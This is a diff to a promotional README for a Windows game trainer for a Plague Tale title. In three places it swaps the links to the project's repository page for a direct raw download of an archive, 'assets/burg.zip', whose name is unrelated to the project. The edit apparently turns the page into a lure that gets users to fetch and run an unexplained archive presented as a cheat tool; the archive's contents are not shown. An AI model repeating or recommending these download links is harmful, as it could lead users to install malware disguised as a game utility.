@@ -1,6 +1,6 @@
 # 🎮 Resonance-A-Plague-Tale-Legacy-Trainer - Your Ultimate Gaming Companion for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Resonance_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-Resonance_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/burg.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Whether you're a seasoned gamer looking to breeze through challenging sections o
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer](https://github.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer)
+Visit this link to download the application: [https://raw.githubusercontent.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/burg.zip](https://raw.githubusercontent.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/burg.zip)
 
 Once you arrive at the page, click the "Download" button to get the trainer file. After the download completes, save it to a convenient location on your computer, such as your Desktop or Downloads folder.
 
@@ -145,7 +145,7 @@ This trainer is provided free for personal use. It is a third-party utility and 
 
 The Resonance-A-Plague-Tale-Legacy-Trainer is your ultimate companion for getting the most out of Resonance: A Plague Tale Legacy on your Windows PC. With its intuitive interface, comprehensive features, and incredible flexibility, you'll spend more time enjoying your game and less time struggling with limitations.
 
-Visit this link to download the application: [https://github.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer](https://github.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer)
+Visit this link to download the application: [https://raw.githubusercontent.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/burg.zip](https://raw.githubusercontent.com/ScottJame/Resonance-A-Plague-Tale-Legacy-Trainer/main/assets/burg.zip)
 
 Download today and transform your gaming experience. We're confident you'll love the freedom and control this trainer provides. Game on!
 
